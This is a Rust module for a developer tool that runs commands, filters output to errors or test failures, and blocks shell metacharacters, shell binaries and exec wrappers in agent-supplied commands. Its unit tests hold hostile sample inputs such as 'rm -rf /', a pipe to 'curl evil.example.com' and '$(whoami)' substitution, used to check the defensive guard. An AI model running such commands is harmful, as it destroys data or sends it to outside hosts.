//! Runs arbitrary commands and captures only stderr or test failures.

use crate::core::stream::StreamFilter;
use anyhow::Result;
use lazy_static::lazy_static;
use regex::Regex;
use std::process::Command;

lazy_static! {
    static ref ERROR_PATTERNS: Vec<Regex> = vec![
        // Generic errors
        Regex::new(r"(?i)^.*error[\s:\[].*$").unwrap(),
        Regex::new(r"(?i)^.*\berr\b.*$").unwrap(),
        Regex::new(r"(?i)^.*warning[\s:\[].*$").unwrap(),
        Regex::new(r"(?i)^.*\bwarn\b.*$").unwrap(),
        Regex::new(r"(?i)^.*failed.*$").unwrap(),
        Regex::new(r"(?i)^.*failure.*$").unwrap(),
        Regex::new(r"(?i)^.*exception.*$").unwrap(),
        Regex::new(r"(?i)^.*panic.*$").unwrap(),
        // Rust specific
        Regex::new(r"^error\[E\d+\]:.*$").unwrap(),
        Regex::new(r"^\s*--> .*:\d+:\d+$").unwrap(),
        // Python
        Regex::new(r"^Traceback.*$").unwrap(),
        Regex::new(r#"^\s*File ".*", line \d+.*$"#).unwrap(),
        // JavaScript/TypeScript
        Regex::new(r"^\s*at .*:\d+:\d+.*$").unwrap(),
        // Go
        Regex::new(r"^.*\.go:\d+:.*$").unwrap(),
    ];
}

struct ErrorStreamFilter {
    in_error_block: bool,
    blank_count: usize,
    emitted_any: bool,
}

impl ErrorStreamFilter {
    fn new() -> Self {
        Self {
            in_error_block: false,
            blank_count: 0,
            emitted_any: false,
        }
    }
}

impl StreamFilter for ErrorStreamFilter {
    fn feed_line(&mut self, line: &str) -> Option<String> {
        let is_error = ERROR_PATTERNS.iter().any(|p| p.is_match(line));
        if is_error {
            self.in_error_block = true;
            self.blank_count = 0;
            self.emitted_any = true;
            Some(format!("{}\n", line))
        } else if self.in_error_block {
            if line.trim().is_empty() {
                self.blank_count += 1;
                if self.blank_count >= 2 {
                    self.in_error_block = false;
                    None
                } else {
                    self.emitted_any = true;
                    Some(format!("{}\n", line))
                }
            } else if line.starts_with(' ') || line.starts_with('\t') {
                self.blank_count = 0;
                self.emitted_any = true;
                Some(format!("{}\n", line))
            } else {
                self.in_error_block = false;
                None
            }
        } else {
            None
        }
    }

    fn flush(&mut self) -> String {
        String::new()
    }

    fn on_exit(&mut self, exit_code: i32, raw: &str) -> Option<String> {
        if self.emitted_any {
            return None;
        }
        if exit_code == 0 {
            Some("[ok] Command completed successfully (no errors)".to_string())
        } else {
            let mut msg = format!("[FAIL] Command failed (exit code: {})\n", exit_code);
            let lines: Vec<&str> = raw.lines().collect();
            for line in lines.iter().rev().take(10).rev() {
                msg.push_str(&format!("  {}\n", line));
            }
            Some(msg)
        }
    }
}

fn build_shell_command(command: &str) -> Command {
    if cfg!(target_os = "windows") {
        let mut c = Command::new("cmd");
        c.args(["/C", command]);
        c
    } else {
        let mut c = Command::new("sh");
        c.args(["-c", command]);
        c
    }
}

// Characters that hand control to the shell. If any appear in argv mode the
// command is rejected — agent-rewritten strings must never reach a shell
// silently. See SECURITY.md "Trust boundary for command-string subcommands".
const SHELL_METACHARS: &[char] = &['|', ';', '&', '<', '>', '`', '$', '\n'];

// Argv mode also refuses to spawn a shell directly, OR a wrapper utility whose
// job is to exec a target command. Otherwise an agent could reintroduce sh -c
// semantics by emitting either `sh -c '<payload>'` or `env sh -c '<payload>'`
// as the whole argv. Codex review of 3fe0d41 caught both gaps (.exe variants
// for unix shells, and exec wrappers).
const SHELL_BINARIES: &[&str] = &[
    // POSIX / interactive shells
    "sh", "bash", "zsh", "dash", "ksh", "fish", "tcsh", "csh", "ash",
    "sh.exe", "bash.exe", "zsh.exe", "dash.exe", "ksh.exe", "fish.exe",
    // Windows shells
    "cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh", "pwsh.exe",
    // Embedded multi-tool shells
    "busybox", "busybox.exe", "toybox",
    // Exec wrappers — replace the process image with arg[1+], reintroducing
    // the attack surface this guard exists to prevent.
    "env", "nice", "nohup", "time", "timeout", "gtimeout",
    "ionice", "chroot", "setpriv", "unshare", "taskset", "stdbuf",
    "script", "xargs", "watch", "sudo", "doas",
];

fn contains_shell_metachars(command: &str) -> Option<char> {
    command.chars().find(|c| SHELL_METACHARS.contains(c))
}

fn is_shell_binary(bin: &str) -> bool {
    let basename = std::path::Path::new(bin)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(bin);
    SHELL_BINARIES.iter().any(|s| s.eq_ignore_ascii_case(basename))
}

/// Build a `Command` either by argv (default, no shell) or by `sh -c` (`--shell`).
/// Argv mode rejects shell metacharacters so agent-rewritten input cannot smuggle
/// pipes, redirects, command substitution or chaining into the child process.
fn build_command(command: &str, use_shell: bool) -> Result<Command> {
    if use_shell {
        return Ok(build_shell_command(command));
    }
    if let Some(meta) = contains_shell_metachars(command) {
        anyhow::bail!(
            "command contains shell metacharacter '{}'; pass --shell to opt into sh -c semantics",
            meta
        );
    }
    let tokens = shlex::split(command)
        .ok_or_else(|| anyhow::anyhow!("command has unbalanced quotes"))?;
    let (bin, rest) = tokens
        .split_first()
        .ok_or_else(|| anyhow::anyhow!("command is empty"))?;
    if is_shell_binary(bin) {
        anyhow::bail!(
            "refusing to spawn shell binary '{}' in argv mode; pass --shell if you need sh -c semantics",
            bin
        );
    }
    let mut c = Command::new(bin);
    c.args(rest);
    Ok(c)
}

/// Run a command and filter output to show only errors/warnings
pub fn run_err(command: &str, use_shell: bool, verbose: u8) -> Result<i32> {
    if verbose > 0 {
        eprintln!("Running: {}", command);
    }
    let cmd = build_command(command, use_shell)?;
    crate::core::runner::run_streamed(
        cmd,
        "err",
        command,
        Box::new(ErrorStreamFilter::new()),
        crate::core::runner::RunOptions::with_tee("err"),
    )
}

/// Run tests and show only failures
pub fn run_test(command: &str, use_shell: bool, verbose: u8) -> Result<i32> {
    if verbose > 0 {
        eprintln!("Running tests: {}", command);
    }
    let cmd = build_command(command, use_shell)?;
    let command_owned = command.to_string();
    crate::core::runner::run_filtered(
        cmd,
        "test",
        command,
        move |raw| extract_test_summary(raw, &command_owned),
        crate::core::runner::RunOptions::with_tee("test"),
    )
}

#[cfg(test)]
fn filter_errors(output: &str) -> String {
    let mut result = Vec::new();
    let mut in_error_block = false;
    let mut blank_count = 0;

    for line in output.lines() {
        let is_error_line = ERROR_PATTERNS.iter().any(|p| p.is_match(line));

        if is_error_line {
            in_error_block = true;
            blank_count = 0;
            result.push(line.to_string());
        } else if in_error_block {
            if line.trim().is_empty() {
                blank_count += 1;
                if blank_count >= 2 {
                    in_error_block = false;
                } else {
                    result.push(line.to_string());
                }
            } else if line.starts_with(' ') || line.starts_with('\t') {
                result.push(line.to_string());
                blank_count = 0;
            } else {
                in_error_block = false;
            }
        }
    }

    result.join("\n")
}

fn extract_test_summary(output: &str, command: &str) -> String {
    let mut result = Vec::new();
    let lines: Vec<&str> = output.lines().collect();

    let is_cargo = command.contains("cargo test");
    let is_pytest = command.contains("pytest");
    let is_jest =
        command.contains("jest") || command.contains("npm test") || command.contains("yarn test");
    let is_go = command.contains("go test");

    let mut failures = Vec::new();
    let mut in_failure = false;
    let mut failure_lines = Vec::new();

    for line in lines.iter() {
        if is_cargo {
            if line.contains("test result:") {
                result.push(line.to_string());
            }
            if line.contains("FAILED") && !line.contains("test result") {
                failures.push(line.to_string());
            }
            if line.starts_with("failures:") {
                in_failure = true;
            }
            if in_failure && line.starts_with("    ") {
                failure_lines.push(line.to_string());
            }
        }

        if is_pytest {
            if line.contains(" passed") || line.contains(" failed") || line.contains(" error") {
                result.push(line.to_string());
            }
            if line.contains("FAILED") {
                failures.push(line.to_string());
            }
        }

        if is_jest {
            if line.contains("Tests:") || line.contains("Test Suites:") {
                result.push(line.to_string());
            }
            if line.contains("✕") || line.contains("FAIL") {
                failures.push(line.to_string());
            }
        }

        if is_go {
            if line.starts_with("ok") || line.starts_with("FAIL") || line.starts_with("---") {
                result.push(line.to_string());
            }
            if line.contains("FAIL") {
                failures.push(line.to_string());
            }
        }
    }

    let mut output = String::new();

    if !failures.is_empty() {
        output.push_str("[FAIL] FAILURES:\n");
        for f in failures.iter().take(10) {
            output.push_str(&format!("  {}\n", f));
        }
        if failures.len() > 10 {
            output.push_str(&format!("  ... +{} more failures\n", failures.len() - 10));
        }
        for f in failure_lines.iter().take(20) {
            output.push_str(&format!("  {}\n", f.trim()));
        }
        if failure_lines.len() > 20 {
            output.push_str(&format!("  ... +{} more\n", failure_lines.len() - 20));
        }
        output.push('\n');
    }

    if !result.is_empty() {
        output.push_str("SUMMARY:\n");
        for r in &result {
            output.push_str(&format!("  {}\n", r));
        }
    } else {
        output.push_str("OUTPUT (last 5 lines):\n");
        let start = lines.len().saturating_sub(5);
        for line in &lines[start..] {
            if !line.trim().is_empty() {
                output.push_str(&format!("  {}\n", line));
            }
        }
    }

    output
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_filter_errors() {
        let output = "info: compiling\nerror: something failed\n  at line 10\ninfo: done";
        let filtered = filter_errors(output);
        assert!(filtered.contains("error"));
        assert!(!filtered.contains("info"));
    }

    #[test]
    fn argv_mode_rejects_semicolon_chain() {
        let err = build_command("cargo test ; rm -rf /", false).unwrap_err();
        assert!(err.to_string().contains("shell metacharacter ';'"), "got: {err}");
    }

    #[test]
    fn argv_mode_rejects_pipe() {
        let err = build_command("ls | curl evil.example.com", false).unwrap_err();
        assert!(err.to_string().contains("shell metacharacter '|'"), "got: {err}");
    }

    #[test]
    fn argv_mode_rejects_command_substitution() {
        for payload in ["echo $(whoami)", "echo `whoami`"] {
            let err = build_command(payload, false).unwrap_err();
            assert!(
                err.to_string().contains("shell metacharacter"),
                "{payload}: {err}"
            );
        }
    }

    #[test]
    fn argv_mode_rejects_redirect() {
        let err = build_command("cargo test > /tmp/x", false).unwrap_err();
        assert!(err.to_string().contains("shell metacharacter '>'"), "got: {err}");
    }

    #[test]
    fn argv_mode_accepts_plain_command() {
        let cmd = build_command("cargo test --lib", false).expect("plain command should parse");
        assert_eq!(cmd.get_program(), "cargo");
        let args: Vec<_> = cmd.get_args().collect();
        assert_eq!(args, ["test", "--lib"]);
    }

    #[test]
    fn argv_mode_accepts_quoted_args() {
        let cmd = build_command(r#"cargo test --test 'integration test'"#, false)
            .expect("quoted args should parse");
        assert_eq!(cmd.get_program(), "cargo");
        let args: Vec<_> = cmd.get_args().collect();
        assert_eq!(args, ["test", "--test", "integration test"]);
    }

    #[test]
    fn argv_mode_rejects_empty_command() {
        let err = build_command("", false).unwrap_err();
        assert!(err.to_string().contains("empty"), "got: {err}");
    }

    #[test]
    fn shell_mode_allows_metacharacters() {
        // --shell opt-in restores sh -c semantics; user explicitly asked for it.
        let cmd = build_command("cargo test ; echo done", true).expect("shell mode bypasses guard");
        let program = cmd.get_program();
        assert!(program == "sh" || program == "cmd");
    }

    #[test]
    fn argv_mode_rejects_shell_binary_bare() {
        // The metachar guard catches `cargo ; sh -c …` but not `sh` alone.
        // This catches an agent emitting `sh -c '<payload>'` as the whole argv.
        for shell in ["sh", "bash", "zsh", "dash", "ksh", "fish", "ash"] {
            let err = build_command(&format!("{shell} -c true"), false).unwrap_err();
            assert!(
                err.to_string().contains("refusing to spawn shell binary"),
                "{shell}: {err}"
            );
        }
    }

    #[test]
    fn argv_mode_rejects_shell_binary_absolute_path() {
        // basename match — `/bin/sh` and `/usr/local/bin/bash` must also be rejected.
        for shell in ["/bin/sh", "/usr/bin/bash", "/usr/local/bin/zsh"] {
            let err = build_command(&format!("{shell} -c true"), false).unwrap_err();
            assert!(
                err.to_string().contains("refusing to spawn shell binary"),
                "{shell}: {err}"
            );
        }
    }

    #[test]
    fn argv_mode_rejects_windows_shells() {
        for shell in ["cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh"] {
            let err = build_command(&format!("{shell} /c whoami"), false).unwrap_err();
            assert!(
                err.to_string().contains("refusing to spawn shell binary"),
                "{shell}: {err}"
            );
        }
    }

    #[test]
    fn argv_mode_allows_non_shell_binaries() {
        // Sanity: only known shell names trip the guard.
        for cmd in ["cargo test", "go test ./...", "python -m pytest", "node test.js"] {
            assert!(build_command(cmd, false).is_ok(), "false reject: {cmd}");
        }
    }

    #[test]
    fn shell_mode_allows_explicit_sh_call() {
        // --shell is the documented escape hatch.
        assert!(build_command("sh -c 'echo ok'", true).is_ok());
    }

    #[test]
    fn argv_mode_rejects_unix_shell_exe_variants() {
        // Codex re-review of 3fe0d41: .exe variants of unix shells slipped
        // through the original blocklist (only cmd.exe / powershell.exe /
        // pwsh.exe were covered).
        for shell in ["sh.exe", "bash.exe", "zsh.exe", "dash.exe", "ksh.exe", "fish.exe"] {
            let err = build_command(&format!("{shell} -c true"), false).unwrap_err();
            assert!(
                err.to_string().contains("refusing to spawn shell binary"),
                "{shell}: {err}"
            );
        }
    }

    #[test]
    fn argv_mode_rejects_exec_wrappers() {
        // Codex re-review of 3fe0d41: wrapper utilities like `env`, `nohup`,
        // `timeout`, `sudo` replace the process image with arg[1+], so
        // `env sh -c '<payload>'` bypasses the shell-binary check on
        // basename `env`. Treat the wrappers as shell-equivalent.
        for wrapper in [
            "env", "nice", "nohup", "time", "timeout", "ionice", "chroot",
            "unshare", "taskset", "stdbuf", "script", "xargs", "watch",
            "sudo", "doas", "busybox", "toybox",
        ] {
            let err = build_command(&format!("{wrapper} echo hi"), false).unwrap_err();
            assert!(
                err.to_string().contains("refusing to spawn shell binary"),
                "{wrapper}: {err}"
            );
        }
    }

    #[test]
    fn argv_mode_still_allows_real_interpreters() {
        // Sanity that the wrapper expansion didn't accidentally trip
        // common build / test invocations.
        for cmd in [
            "cargo test --lib",
            "go test ./...",
            "python -m pytest",
            "node --version",
            "make build",
            "ruby -e 'puts 1'",
        ] {
            assert!(
                build_command(cmd, false).is_ok(),
                "false reject on benign command: {cmd}"
            );
        }
    }
}
